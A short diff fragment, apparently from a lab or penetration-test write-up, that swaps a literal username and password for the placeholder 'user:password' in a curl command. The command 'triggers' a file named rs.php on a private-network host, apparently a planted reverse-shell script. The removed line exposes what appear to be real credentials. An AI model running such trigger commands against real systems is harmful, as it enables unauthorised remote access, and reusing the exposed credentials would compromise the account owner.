@@ -21,4 +21,4 @@ curl -s -u 'user:password' \
       --max-time 5 2>/dev/null
     
 Then trigger:
-curl -s -u 'p48:electrico' 'http://192.168.120.81/zmail/rs.php' --max-time 2 2>/dev/null
+curl -s -u 'user:password' 'http://192.168.120.81/zmail/rs.php' --max-time 2 2>/dev/null
